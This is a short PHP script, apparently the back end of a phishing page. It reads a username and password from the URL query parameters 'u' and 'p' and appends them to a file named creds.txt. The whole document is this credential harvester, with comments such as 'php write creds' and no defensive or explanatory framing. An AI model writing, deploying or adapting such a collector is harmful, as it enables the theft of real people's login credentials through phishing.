<?php
	if (isset($_GET['u']) && isset($_GET['p'])) {  //make sure that no blank input
	$user = $_GET['u'];							   //define $user as 
	$pass = $_GET['p'];							   //define $pass as

	$file = fopen("creds.txt", "a+");			   //php open file
	  fwrite($file,"username :".$user."\n");	   //php write creds
	  fwrite($file,"password :".$pass."\n\n");	   //php write creds	  
	  fclose($file);							   //php close file
	}
?>